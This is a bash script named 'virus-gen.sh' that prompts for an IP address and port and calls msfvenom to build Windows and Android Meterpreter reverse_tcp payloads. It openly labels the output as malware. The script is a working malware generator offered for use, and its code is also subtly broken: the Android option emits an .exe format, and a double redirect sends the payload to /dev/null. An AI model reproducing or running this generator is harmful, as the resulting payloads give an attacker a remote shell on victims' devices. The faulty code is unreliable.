#!/bin/bash

# Colors
green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
cyan="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

function checkRoot() {
  if [ "$EUID" -ne 0 ]; then
    echo -e "\n${red}[!] You are not root. Please, execute the program as root, since it needs root privileges!${end}\n"
    exit 1
  fi 
}

checkRoot

# Ctrl + c 
function ctrl_c(){
  echo -e "${red}\n\n[!] Terminating Program...${end}\n" 
  tput cnorm; exit 1
}

trap ctrl_c INT

function helpPannel(){
  echo -e "\n${yellow}[+]${end} ${gray}Usage: ./virus-gen.sh ${end}${yellow}-w ${end}${gray}| ${end}${yellow}-a ${end}"
  echo -e "\n\t${purple} -w${end}${gray}) Specifies the type of malware for Windows.${end}"
  echo -e "\t${purple} -a${end}${gray}) Specifies the type of malware for Android.${end}"
  echo -e "\t${purple} -h${end}${gray}) Shows the help pannel.${end}\n"
  echo -e "\n${green} [By ne0mesys]\n${end}"
}


function windows(){
  echo -e "\n\n${green}[+]${end}${gray} WINDOWS MALWARE${end}${green} [+]${end}\n"
  echo -e -n "\n${yellow}[+]${end}${gray} Enter the ${end}${yellow}name${end}${gray} of the file:${end}${cyan} " && read name

  if [ -z "$name" ]; then
    echo -e "\n${red}[!] Error: Please, specify the name of the file!${end}\n\n"
    exit 1
  else 
    echo -e -n "\n${yellow}[+]${end}${gray} Enter your ${end}${yellow}IP Address${end}${gray}:${end}${cyan} " && read IP

    if [ -z "$IP" ]; then
      echo -e "\n${red}[!] Error: Please, specify your IP Address!\n\n${end}"
      exit 1
    else 
      echo -e -n "\n${yellow}[+]${end}${gray} Enter the ${end}${yellow}PORT${end}${gray} you want to use:${end}${cyan} " && read port 

      if [ -z "$port" ]; then 
        echo -e "\n${red}[!] Error: Please, specify the port!\n\n${end}"
        exit 1
      else 

        tput civis
        echo -e "\n${green}[+]${end}${gray} Generating ${end}${green}.EXE${end}${gray} file...\n${end}"

        sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$port" -f exe > "$name".exe > /dev/null 2>&1
        
        echo -e "\n${green}[+]${end}${gray} .EXE file saved as ${end}${green}${name}${end}.\n"
        tput cnorm

      fi
    fi 
  fi
}

function android(){
  echo -e "\n\n${green}[+]${end}${gray} ANDROID MALWARE${end}${green} [+]${end}\n"
  echo -e -n "\n${yellow}[+]${end}${gray} Enter the ${end}${yellow}name${end}${gray} of the file:${end}${cyan} " && read name

  if [ -z "$name" ]; then
    echo -e "\n${red}[!] Error: Please, specify the name of the file!${end}\n\n"
    exit 1
  else 
    echo -e -n "\n${yellow}[+]${end}${gray} Enter your ${end}${yellow}IP Address${end}${gray}:${end}${cyan} " && read IP

    if [ -z "$IP" ]; then
      echo -e "\n${red}[!] Error: Please, specify your IP Address!\n\n${end}"
      exit 1
    else 
      echo -e -n "\n${yellow}[+]${end}${gray} Enter the ${end}${yellow}PORT${end}${gray} you want to use:${end}${cyan} " && read port 

      if [ -z "$port" ]; then 
        echo -e "\n${red}[!] Error: Please, specify the port!\n\n${end}"
        exit 1
      else 

        tput civis
        echo -e "\n${green}[+]${end}${gray} Generating ${end}${green}.APK${end}${gray} file...\n${end}"

        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="$IP" LPORT="$port" -f exe > "$name".exe > /dev/null 2>&1
        
        echo -e "\n${green}[+]${end}${gray} .APK file saved as ${end}${green}${name}${end}.\n"
        tput cnorm

      fi
    fi 
  fi
}




# Indicator
declare -i parameter_counter=0

while getopts "wah" arg; do
  case $arg in 
    w) let parameter_counter+=1;;
    a) let parameter_counter+=2;;
    h) ;;
    \?) 
      echo -e "\n${red}[!] Invalid option: -$OPTARG${end}"
      exit 1;;
  esac
done

if [ $parameter_counter -eq 1 ]; then 
  windows
elif [ $parameter_counter -eq 2 ]; then 
  android
else 
  helpPannel
fi

